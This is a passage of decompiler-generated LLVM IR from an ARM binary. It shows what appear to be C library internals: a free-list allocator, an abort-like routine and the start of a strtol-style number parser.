  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_13d8c = load i32, i32* %arg1, align 4
  store i32 %v2_13d8c, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_13e046 = icmp eq i32 %v2_13d8c, 0
  br i1 %v2_13e046, label %dec_label_pc_13e0c, label %dec_label_pc_13d98

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d88, %dec_label_pc_13e00
  %v0_13dd8 = phi i32 [ %v3_13e00, %dec_label_pc_13e00 ], [ %v2_13d8c, %dec_label_pc_13d88 ]
  %v1_13d98 = inttoptr i32 %v0_13dd8 to i32*
  %v2_13d98 = load i32, i32* %v1_13d98, align 4
  store i32 %v2_13d98, i32* %r0.global-to-local, align 4
  %v2_13d9c = sub i32 %v0_13dd8, %v2_13d98
  %v1_13da0 = add i32 %v2_13d9c, 12
  %v3_13da4 = icmp uge i32 %v1_13da0, %arg2
  %v9_13da4 = icmp eq i32 %v1_13da0, %arg2
  %v2_13da8 = xor i1 %v9_13da4, true
  %v3_13da8 = and i1 %v3_13da4, %v2_13da8
  br i1 %v3_13da8, label %dec_label_pc_13e00, label %dec_label_pc_13dac

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13d98
  br i1 %v9_13da4, label %dec_label_pc_13db0, label %dec_label_pc_13e0c

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13dac
  %v1_13db0 = add i32 %arg3, 3
  %v1_13db4 = and i32 %v1_13db0, -4
  store i32 %v1_13db4, i32* %r2.global-to-local, align 4
  %v2_13db8 = sub i32 %v2_13d98, %v1_13db4
  %v3_13db8 = icmp ult i32 %v2_13d98, %v1_13db4
  br i1 %v3_13db8, label %dec_label_pc_13e0c, label %dec_label_pc_13dc0

dec_label_pc_13dc0:                               ; preds = %dec_label_pc_13db0
  %v1_13dc0 = add i32 %v1_13db4, 44
  %v3_13dc4 = icmp ult i32 %v2_13d98, %v1_13dc0
  br i1 %v3_13dc4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_13dc0
  store i32 %v2_13db8, i32* %v1_13d98, align 4
  %v1_13dd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13dd0, i32* %r0.global-to-local, align 4
  ret i32 %v1_13dd0

.thread2:                                         ; preds = %dec_label_pc_13dc0
  %v1_13dd8 = add i32 %v0_13dd8, 4
  %v2_13dd8 = inttoptr i32 %v1_13dd8 to i32*
  %v3_13dd8 = load i32, i32* %v2_13dd8, align 4
  store i32 %v3_13dd8, i32* %r2.global-to-local, align 4
  %v2_13ddc = icmp eq i32 %v3_13dd8, 0
  br i1 %v2_13ddc, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_13de0 = add i32 %v0_13dd8, 8
  %v3_13de0 = inttoptr i32 %v2_13de0 to i32*
  %v4_13de0 = load i32, i32* %v3_13de0, align 4
  %v3_13de4 = add i32 %v3_13dd8, 8
  %v4_13de4 = inttoptr i32 %v3_13de4 to i32*
  store i32 %v4_13de0, i32* %v4_13de4, align 4
  %v0_13de8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_13de8 = phi i32 [ %v0_13dd8, %.thread2 ], [ %v0_13de8.pre, %bb17 ]
  %v1_13de8 = add i32 %v0_13de8, 8
  %v2_13de8 = inttoptr i32 %v1_13de8 to i32*
  %v3_13de8 = load i32, i32* %v2_13de8, align 4
  store i32 %v3_13de8, i32* %r2.global-to-local, align 4
  %v1_13dec = add i32 %v0_13de8, 4
  %v2_13dec = inttoptr i32 %v1_13dec to i32*
  %v3_13dec = load i32, i32* %v2_13dec, align 4
  %v2_13df0 = icmp eq i32 %v3_13de8, 0
  br i1 %v2_13df0, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_13df4 = add i32 %v3_13de8, 4
  %v4_13df4 = inttoptr i32 %v3_13df4 to i32*
  store i32 %v3_13dec, i32* %v4_13df4, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_13df8 = load i32, i32* %lr.global-to-local, align 4
  %v3_13df8 = inttoptr i32 %v2_13df8 to i32*
  store i32 %v3_13dec, i32* %v3_13df8, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_13dfc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_13dfc

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13d98
  %v1_13e00 = add i32 %v0_13dd8, 4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  %v3_13e00 = load i32, i32* %v2_13e00, align 4
  store i32 %v3_13e00, i32* %ip.global-to-local, align 4
  %v2_13e04 = icmp eq i32 %v3_13e00, 0
  br i1 %v2_13e04, label %dec_label_pc_13e04.dec_label_pc_13e0c.loopexit_crit_edge, label %dec_label_pc_13d98

dec_label_pc_13e04.dec_label_pc_13e0c.loopexit_crit_edge: ; preds = %dec_label_pc_13e00
  br label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13db0, %dec_label_pc_13d88, %dec_label_pc_13e04.dec_label_pc_13e0c.loopexit_crit_edge, %dec_label_pc_13dac
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13e00, { 1, 2, 0 }
  uselistorder i32 %v0_13de8, { 1, 0 }
  uselistorder i32 %v1_13db4, { 0, 2, 1, 3 }
  uselistorder i1 %v9_13da4, { 1, 0 }
  uselistorder i32 %v2_13d98, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_13dd8, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_13e0c, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13d98, { 1, 0 }
}

define i32 @function_13e14() local_unnamed_addr {
dec_label_pc_13e14:
  %v0_13e14 = load i32, i32* @r2, align 4
  %v2_13e14 = icmp eq i32 %v0_13e14, 0
  %v0_13e18 = load i32, i32* @r3, align 4
  %v1_13e18 = load i32, i32* @r1, align 4
  %v2_13e18 = add i32 %v1_13e18, 4
  %v3_13e18 = inttoptr i32 %v2_13e18 to i32*
  store i32 %v0_13e18, i32* %v3_13e18, align 4
  %v0_13e1c = load i32, i32* @r2, align 4
  %v1_13e1c = load i32, i32* @r1, align 4
  %v2_13e1c = add i32 %v1_13e1c, 8
  %v3_13e1c = inttoptr i32 %v2_13e1c to i32*
  store i32 %v0_13e1c, i32* %v3_13e1c, align 4
  %v1_13e24 = load i32, i32* @r1, align 4
  br i1 %v2_13e14, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13e14
  %v2_13e20 = load i32, i32* @r2, align 4
  %v3_13e20 = add i32 %v2_13e20, 4
  %v4_13e20 = inttoptr i32 %v3_13e20 to i32*
  store i32 %v1_13e24, i32* %v4_13e20, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_13e14
  %v2_13e24 = load i32, i32* @r0, align 4
  %v3_13e24 = inttoptr i32 %v2_13e24 to i32*
  store i32 %v1_13e24, i32* %v3_13e24, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_13e28 = load i32, i32* @r3, align 4
  %v2_13e28 = icmp eq i32 %v0_13e28, 0
  br i1 %v2_13e28, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_13e2c = load i32, i32* @r1, align 4
  %v3_13e2c = add i32 %v0_13e28, 8
  %v4_13e2c = inttoptr i32 %v3_13e2c to i32*
  store i32 %v1_13e2c, i32* %v4_13e2c, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_13e30 = load i32, i32* @r0, align 4
  ret i32 %v1_13e30

; uselistorder directives
  uselistorder i32 %v1_13e24, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_13e34() local_unnamed_addr {
dec_label_pc_13e34:
  %v0_13e34 = load i32, i32* @r2, align 4
  %v2_13e34 = icmp eq i32 %v0_13e34, 0
  %v1_13e38 = load i32, i32* @r1, align 4
  br i1 %v2_13e34, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13e34
  %v2_13e38 = load i32, i32* @r0, align 4
  %v3_13e38 = inttoptr i32 %v2_13e38 to i32*
  store i32 %v1_13e38, i32* %v3_13e38, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_13e34
  %v3_13e3c = add i32 %v0_13e34, 4
  %v4_13e3c = inttoptr i32 %v3_13e3c to i32*
  store i32 %v1_13e38, i32* %v4_13e3c, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_13e40 = load i32, i32* @r2, align 4
  %v1_13e40 = load i32, i32* @r1, align 4
  %v2_13e40 = add i32 %v1_13e40, 8
  %v3_13e40 = inttoptr i32 %v2_13e40 to i32*
  store i32 %v0_13e40, i32* %v3_13e40, align 4
  %v1_13e44 = load i32, i32* @r0, align 4
  ret i32 %v1_13e44

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13e48(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e48:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13e48 = load i32, i32* @r4, align 4
  store i32 %v3_13e48, i32* %stack_var_-20, align 4
  %v2_13e4c = load i32, i32* %arg1, align 4
  store i32 %v2_13e4c, i32* %r4.global-to-local, align 4
  %v2_13e50 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_13e6c2 = icmp eq i32 %v2_13e4c, 0
  br i1 %v2_13e6c2, label %dec_label_pc_13f1c, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e48, %dec_label_pc_13e64
  %v0_13eac = phi i32 [ %v0_13eb4, %dec_label_pc_13e64 ], [ 0, %dec_label_pc_13e48 ]
  %v0_13eb4 = phi i32 [ %v3_13e68, %dec_label_pc_13e64 ], [ %v2_13e4c, %dec_label_pc_13e48 ]
  %v1_13e705.in = phi i32 [ %v3_13e68, %dec_label_pc_13e64 ], [ %v2_13e4c, %dec_label_pc_13e48 ]
  %v1_13e705 = add i32 %v1_13e705.in, 12
  %v3_13e5c = icmp ult i32 %v1_13e705, %arg2
  br i1 %v3_13e5c, label %dec_label_pc_13e64, label %dec_label_pc_13e7c

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e5c
  store i32 %v0_13eb4, i32* %r6.global-to-local, align 4
  %v1_13e68 = add i32 %v0_13eb4, 4
  %v2_13e68 = inttoptr i32 %v1_13e68 to i32*
  %v3_13e68 = load i32, i32* %v2_13e68, align 4
  store i32 %v3_13e68, i32* %r4.global-to-local, align 4
  %v2_13e6c = icmp eq i32 %v3_13e68, 0
  br i1 %v2_13e6c, label %dec_label_pc_13e6c.dec_label_pc_13f1c.loopexit_crit_edge, label %dec_label_pc_13e5c

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e5c
  %v1_13e7c = inttoptr i32 %v0_13eb4 to i32*
  %v2_13e7c = load i32, i32* %v1_13e7c, align 4
  %v2_13e80 = sub i32 %v0_13eb4, %v2_13e7c
  %v1_13e84 = add i32 %v2_13e80, 12
  %v3_13e88 = icmp uge i32 %v1_13e84, %v2_13e50
  %v9_13e88 = icmp eq i32 %v1_13e84, %v2_13e50
  %v2_13e8c = xor i1 %v9_13e88, true
  %v3_13e8c = and i1 %v3_13e88, %v2_13e8c
  br i1 %v3_13e8c, label %dec_label_pc_13f1c, label %dec_label_pc_13e90

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13e7c
  %v2_13e90 = add i32 %v2_13e7c, %arg3
  store i32 %v2_13e90, i32* %r7.global-to-local, align 4
  br i1 %v9_13e88, label %dec_label_pc_13e98, label %dec_label_pc_13ec4

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e90
  %v2_13e98 = icmp eq i32 %v0_13eac, 0
  br i1 %v2_13e98, label %dec_label_pc_13f10, label %dec_label_pc_13ea0

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e98
  %v1_13ea0 = add i32 %v0_13eac, 12
  %v9_13ea4 = icmp eq i32 %v1_13ea0, %arg2
  br i1 %v9_13ea4, label %dec_label_pc_13eac, label %dec_label_pc_13f10

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13ea0
  %v1_13eac = inttoptr i32 %v0_13eac to i32*
  %v2_13eac = load i32, i32* %v1_13eac, align 4
  %v1_13eb0 = add i32 %v0_13eac, 8
  %v2_13eb0 = inttoptr i32 %v1_13eb0 to i32*
  %v3_13eb0 = load i32, i32* %v2_13eb0, align 4
  store i32 %v3_13eb0, i32* @r2, align 4
  store i32 %v0_13eb4, i32* @r1, align 4
  %v2_13eb8 = add i32 %v2_13eac, %v2_13e90
  store i32 %v2_13eb8, i32* %r7.global-to-local, align 4
  %v0_13ebc = call i32 @function_13e34()
  br label %dec_label_pc_13f10

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13e90
  %v1_13ec4 = add i32 %v0_13eb4, 4
  %v2_13ec4 = inttoptr i32 %v1_13ec4 to i32*
  %v3_13ec4 = load i32, i32* %v2_13ec4, align 4
  store i32 %v3_13ec4, i32* %r5.global-to-local, align 4
  %v2_13ec8 = icmp eq i32 %v3_13ec4, 0
  br i1 %v2_13ec8, label %dec_label_pc_13efc, label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13ec4
  %v1_13ed0 = inttoptr i32 %v3_13ec4 to i32*
  %v2_13ed0 = load i32, i32* %v1_13ed0, align 4
  %v2_13ed4 = sub i32 %v3_13ec4, %v2_13ed0
  %v1_13ed8 = add i32 %v2_13ed4, 12
  %v9_13edc = icmp eq i32 %v2_13e50, %v1_13ed8
  br i1 %v9_13edc, label %dec_label_pc_13ee4, label %dec_label_pc_13efc

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13ed0
  store i32 %v0_13eac, i32* @r2, align 4
  store i32 %v3_13ec4, i32* @r1, align 4
  %v2_13eec = add i32 %v2_13ed0, %v2_13e90
  store i32 %v2_13eec, i32* %r7.global-to-local, align 4
  %v0_13ef0 = call i32 @function_13e34()
  %v0_13ef4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13ef4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f10

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13ed0, %dec_label_pc_13ec4
  %v2_13efc = add i32 %v0_13eb4, %arg3
  store i32 %v2_13efc, i32* %r4.global-to-local, align 4
  store i32 %v3_13ec4, i32* @r3, align 4
  store i32 %v0_13eac, i32* @r2, align 4
  store i32 %v2_13efc, i32* @r1, align 4
  %v0_13f0c = call i32 @function_13e14()
  br label %dec_label_pc_13f10

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13ea0, %dec_label_pc_13e98, %dec_label_pc_13ee4, %dec_label_pc_13eac, %dec_label_pc_13efc
  %v0_13f10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13f10, i32* %r5.global-to-local, align 4
  %v0_13f14 = load i32, i32* %r7.global-to-local, align 4
  %v2_13f14 = inttoptr i32 %v0_13f10 to i32*
  store i32 %v0_13f14, i32* %v2_13f14, align 4
  br label %dec_label_pc_13f34

dec_label_pc_13e6c.dec_label_pc_13f1c.loopexit_crit_edge: ; preds = %dec_label_pc_13e64
  br label %dec_label_pc_13f1c

dec_label_pc_13f1c:                               ; preds = %dec_label_pc_13e48, %dec_label_pc_13e6c.dec_label_pc_13f1c.loopexit_crit_edge, %dec_label_pc_13e7c
  %v1_13f1c = add i32 %v2_13e50, -12
  store i32 %v1_13f1c, i32* %r5.global-to-local, align 4
  %v3_13f20 = inttoptr i32 %v1_13f1c to i32*
  store i32 %arg3, i32* %v3_13f20, align 4
  %v0_13f24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13f24, i32* @r3, align 4
  %v0_13f28 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13f28, i32* @r2, align 4
  %v0_13f2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13f2c, i32* @r1, align 4
  %v0_13f30 = call i32 @function_13e14()
  br label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f10, %dec_label_pc_13f1c
  %v0_13f34 = load i32, i32* %r5.global-to-local, align 4
  %v2_13f38 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13f38, i32* @r4, align 4
  ret i32 %v0_13f34

; uselistorder directives
  uselistorder i32 %v3_13ec4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_13e88, { 1, 0 }
  uselistorder i32 %v3_13e68, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13eb4, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_13eac, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_13e14, { 1, 0 }
  uselistorder i32* @r3, { 0, 3, 1, 2, 4 }
  uselistorder i32 ()* @function_13e34, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13f34, { 1, 0 }
  uselistorder label %dec_label_pc_13f1c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13f10, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_13e5c, { 1, 0 }
}

define i32 @function_13f3c() local_unnamed_addr {
dec_label_pc_13f58.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_13f3c = ptrtoint i32* %stack_var_-268 to i32
  %v1_13f4c = call i32 @function_144d4()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_13f58 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f58.lr.ph, %dec_label_pc_13f58
  %v1_13f5c = phi i32 [ 31, %dec_label_pc_13f58.lr.ph ], [ %v1_13f68, %dec_label_pc_13f58 ]
  %v4_13f5c = mul i32 %v1_13f5c, 4
  %v5_13f5c = add i32 %v4_13f5c, %v2_13f58
  %v2_13f64 = add i32 %v5_13f5c, -128
  %v3_13f64 = inttoptr i32 %v2_13f64 to i32*
  store i32 0, i32* %v3_13f64, align 4
  %v0_13f68 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f68, -1
  store i32 %v1_13f68, i32* %r1.global-to-local, align 4
  %v6_13f68 = icmp slt i32 %v1_13f68, 0
  br i1 %v6_13f68, label %dec_label_pc_13f70, label %dec_label_pc_13f58

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f58
  %v2_13f70 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_13f70, i32* @r4, align 4
  store i32 %v2_13f70, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_13f7c = call i32 @function_138f8()
  %v2_13f80 = icmp eq i32 %v0_13f7c, 0
  br i1 %v2_13f80, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13f70
  store i32 %v2_13f70, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13f70, %bb
  store i32 81812, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13f80, i32 ptrtoint (i32* @global_var_13118.616 to i32))
  %v2_13f98 = load i32, i32* @global_var_1e440.618, align 4
  %v2_13f9c = icmp eq i32 %v2_13f98, 0
  br i1 %v2_13f9c, label %dec_label_pc_13fa4, label %dec_label_pc_13fd4

dec_label_pc_13fa4:                               ; preds = %.thread1
  store i32 1, i32* @global_var_1e440.618, align 4
  br label %dec_label_pc_13fac

dec_label_pc_13fac:                               ; preds = %dec_label_pc_14024, %dec_label_pc_13fa4
  %v1_13fb8 = call i32 @function_144d4()
  %v1_13fc0 = call i32 @function_137bc(i32 6)
  store i32 81876, i32* @lr, align 4
  %v1_13fd0 = call i32 @function_144d4()
  %v2_13fd8.pre = load i32, i32* @global_var_1e440.618, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %.thread1, %dec_label_pc_13fac
  %v0_14048 = phi i32 [ %v2_13f98, %.thread1 ], [ %v2_13fd8.pre, %dec_label_pc_13fac ]
  store i32 ptrtoint (i32* @global_var_1e440.618 to i32), i32* %ip.global-to-local, align 4
  %v7_13fdc = icmp eq i32 %v0_14048, 1
  br i1 %v7_13fdc, label %dec_label_pc_1400c.lr.ph, label %dec_label_pc_14040

dec_label_pc_1400c.lr.ph:                         ; preds = %dec_label_pc_13fd4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1e440.618, align 4
  %v2_13ff8 = bitcast i32* %stack_var_-268 to i8*
  %v3_13ff8 = call i32 @function_134d0(i8* %v2_13ff8, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1400c

dec_label_pc_1400c:                               ; preds = %dec_label_pc_1400c.lr.ph, %dec_label_pc_1400c
  %v1_14010 = phi i32 [ 31, %dec_label_pc_1400c.lr.ph ], [ %v1_1401c, %dec_label_pc_1400c ]
  %v4_14010 = mul i32 %v1_14010, 4
  %v5_14010 = add i32 %v4_14010, %v2_13f58
  %v2_14018 = add i32 %v5_14010, -264
  %v3_14018 = inttoptr i32 %v2_14018 to i32*
  store i32 -1, i32* %v3_14018, align 4
  %v0_1401c = load i32, i32* %r1.global-to-local, align 4
  %v1_1401c = add i32 %v0_1401c, -1
  store i32 %v1_1401c, i32* %r1.global-to-local, align 4
  %v6_1401c = icmp slt i32 %v1_1401c, 0
  br i1 %v6_1401c, label %dec_label_pc_14024, label %dec_label_pc_1400c

dec_label_pc_14024:                               ; preds = %dec_label_pc_1400c
  store i32 %v2_13f3c, i32* %r1.global-to-local, align 4
  %v4_14038 = call i32 @function_147c0(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_13fac

dec_label_pc_14040:                               ; preds = %dec_label_pc_13fd4
  %v7_14040 = icmp eq i32 %v0_14048, 2
  br i1 %v7_14040, label %dec_label_pc_14048, label %dec_label_pc_14054

dec_label_pc_14048:                               ; preds = %dec_label_pc_14040
  store i32 3, i32* @global_var_1e440.618, align 4
  %v0_14050 = call i32 @function_13f3c()
  %v2_14054.pre = load i32, i32* @global_var_1e440.618, align 4
  br label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_14040, %dec_label_pc_14048
  %v1_1405c = phi i32 [ %v0_14048, %dec_label_pc_14040 ], [ %v2_14054.pre, %dec_label_pc_14048 ]
  %v7_14058 = icmp eq i32 %v1_1405c, 3
  br i1 %v7_14058, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_14054
  %v2_14064 = load i32, i32* %ip.global-to-local, align 4
  %v3_14064 = inttoptr i32 %v2_14064 to i32*
  store i32 4, i32* %v3_14064, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14054, %bb27
  call void @__pseudo_cond_branch(i1 %v7_14058, i32 ptrtoint (i32* @global_var_148d8.620 to i32))
  br label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %dec_label_pc_1406c, %.thread3
  %v0_1406c = call i32 @function_13f3c()
  br label %dec_label_pc_1406c

; uselistorder directives
  uselistorder i32 %v1_1401c, { 2, 1, 0 }
  uselistorder i32 %v1_13f68, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 8, 7, 2 }
  uselistorder i32* @global_var_1e440.618, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14054, { 1, 0 }
  uselistorder label %dec_label_pc_1400c, { 1, 0 }
  uselistorder label %dec_label_pc_13fd4, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13f58, { 1, 0 }
}

define i32 @function_14084(i8* %arg1) local_unnamed_addr {
dec_label_pc_14084:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_14098 = load i32, i32* @r4, align 4
  store i32 %v3_14098, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_140bc.pre = load i32, i32* bitcast (i32** @global_var_1e390.623 to i32*), align 4
  br label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %dec_label_pc_140b4, %dec_label_pc_14084
  %v0_140ec = phi i32 [ %tmp, %dec_label_pc_14084 ], [ %v1_140b0, %dec_label_pc_140b4 ]
  store i32 %v0_140ec, i32* %r4.global-to-local, align 4
  %v1_140b8 = inttoptr i32 %v0_140ec to i8*
  %v2_140b8 = load i8, i8* %v1_140b8, align 1
  %v3_140b8 = zext i8 %v2_140b8 to i32
  %v3_140c0 = mul nuw nsw i32 %v3_140b8, 2
  %v4_140c0 = add i32 %v3_140c0, %v2_140bc.pre
  %v5_140c0 = inttoptr i32 %v4_140c0 to i8*
  %v6_140c0 = load i8, i8* %v5_140c0, align 1
  %v1_140c4 = and i8 %v6_140c0, 32
  %v2_140c4 = icmp eq i8 %v1_140c4, 0
  %v1_140b0 = add i32 %v0_140ec, 1
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_140b4

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140b4
  %v7_140cc = icmp eq i8 %v2_140b8, 43
  br i1 %v7_140cc, label %dec_label_pc_140ec, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140cc
  %v7_140d4 = icmp eq i8 %v2_140b8, 45
  br i1 %v7_140d4, label %dec_label_pc_140ec, label %bb

bb:                                               ; preds = %dec_label_pc_140d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140cc, %dec_label_pc_140d4
  %storemerge30 = phi i32 [ 1, %dec_label_pc_140d4 ], [ 0, %dec_label_pc_140cc ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_140b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %bb, %dec_label_pc_140ec
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_14150 = call i32 @function_12bf8(i32 -1, i32 10)
  %v0_14154 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14154, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_14160 = urem i32 %v2_14150, 256
  store i32 %v1_14160, i32* %sl.global-to-local, align 4
  %v0_14164 = call i32 @function_12ae8()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_14164, i32* %r8.global-to-local, align 4
  %v0_14178.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14174:                               ; preds = %bb48, %dec_label_pc_141d4
  %v0_14174 = phi i32 [ %v1_141a4, %bb48 ], [ %v0_14174.pre, %dec_label_pc_141d4 ]
  store i32 %v0_14174, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14148, %dec_label_pc_14174
  %v0_141a4 = phi i32 [ %v0_14178.pre, %dec_label_pc_14148 ], [ %v0_14174, %dec_label_pc_14174 ]
  %v1_14178 = inttoptr i32 %v0_141a4 to i8*
  %v2_14178 = load i8, i8* %v1_14178, align 1
  %v3_14178 = zext i8 %v2_14178 to i32
  %v1_1417c = add nsw i32 %v3_14178, -48
  %v1_14180 = urem i32 %v1_1417c, 256
  %v1_14188 = or i32 %v3_14178, 32
  %tmp56 = icmp ult i32 %v1_14180, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14178
  %tmp57 = icmp ugt i32 %v1_14188, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_14190
  %v1_14194 = add nsw i32 %v1_14188, -87
